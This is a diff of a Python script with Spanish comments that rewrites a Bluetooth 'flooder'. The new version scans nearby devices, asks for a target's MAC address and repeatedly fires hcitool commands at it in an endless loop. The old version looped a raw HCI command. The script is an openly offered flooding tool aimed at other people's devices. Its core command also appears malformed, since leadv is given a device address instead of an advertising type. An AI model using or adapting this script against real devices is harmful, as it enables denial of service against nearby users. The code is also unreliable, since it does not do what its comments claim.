@@ -1,59 +1,66 @@
 import subprocess
 import time
-import threading
-import logging
+import argparse
+import re
 
-# Configuración del logging
-logging.basicConfig(filename='flood_messages.log', level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+def scan_devices():
+    """Escanea dispositivos Bluetooth cercanos y los muestra."""
+    try:
+        result = subprocess.run(
+            ["hcitool", "scan"],
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        print("Dispositivos encontrados:")
+        print(result.stdout.decode())
+    except subprocess.CalledProcessError as e:
+        print(f"Error al escanear dispositivos: {e}")
 
-class Flooder:
-    def __init__(self, command, interval=1):
-        self.command = command
-        self.interval = interval
-        self._stop_event = threading.Event()
+def flood_data(interface, device_address, interval):
+    """Envía paquetes a un dispositivo Bluetooth específico."""
+    try:
+        while True:
+            # El comando para enviar datos podría variar dependiendo del uso
+            command = ["hcitool", "-i", interface, "leadv", device_address]
+            result = subprocess.run(
+                command,
+                check=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            print(result.stdout.decode())
+            time.sleep(interval)
+    except subprocess.CalledProcessError as e:
+        print(f"Error al ejecutar el comando: {e}")
+    except KeyboardInterrupt:
+        print("\nInterrupción por el usuario. Terminando...")
+    except Exception as e:
+        print(f"Se produjo un error inesperado: {e}")
 
-    def _send_command(self):
-        try:
-            # Ejecutar el comando usando subprocess para mayor control
-            result = subprocess.run(self.command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            logging.info(f"Comando ejecutado con éxito: {result.stdout.decode().strip()}")
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Error al ejecutar el comando: {e.stderr.decode().strip()}")
-
-    def start(self):
-        logging.info("Iniciando el flooder...")
-        self._stop_event.clear()
-        self.thread = threading.Thread(target=self._run)
-        self.thread.daemon = True
-        self.thread.start()
-
-    def _run(self):
-        while not self._stop_event.is_set():
-            self._send_command()
-            time.sleep(self.interval)
-
-    def stop(self):
-        logging.info("Deteniendo el flooder...")
-        self._stop_event.set()
-        self.thread.join()
-        logging.info("Flooder detenido.")
+def get_device_address():
+    """Solicita la dirección del dispositivo Bluetooth al usuario."""
+    address_pattern = re.compile(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
+    while True:
+        address = input("Introduce la dirección del dispositivo Bluetooth (formato XX:XX:XX:XX:XX:XX): ")
+        if address_pattern.fullmatch(address):
+            return address
+        print("Dirección inválida. Por favor, usa el formato XX:XX:XX:XX:XX:XX.")
 
 def main():
-    # Configuración del comando y el intervalo
-    command = ["hcitool", "-i", "hci0", "cmd", "0x08", "0x0004", "01", "00"]
-    interval = 1  # Intervalo en segundos
-
-    flooder = Flooder(command, interval)
+    parser = argparse.ArgumentParser(description="Envía comandos a un dispositivo Bluetooth repetidamente.")
+    parser.add_argument("interface", type=str, help="La interfaz Bluetooth a usar (por ejemplo, hci0).")
+    parser.add_argument("--scan", action="store_true", help="Escanea dispositivos Bluetooth cercanos.")
+    parser.add_argument("--interval", type=float, default=1.0, help="Intervalo en segundos entre comandos.")
     
-    try:
-        flooder.start()
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        logging.info("Interrupción del usuario. Terminando...")
-    finally:
-        flooder.stop()
+    args = parser.parse_args()
+    
+    if args.scan:
+        scan_devices()
+        return
+    
+    device_address = get_device_address()
+    flood_data(args.interface, device_address, args.interval)
 
 if __name__ == "__main__":
     main()
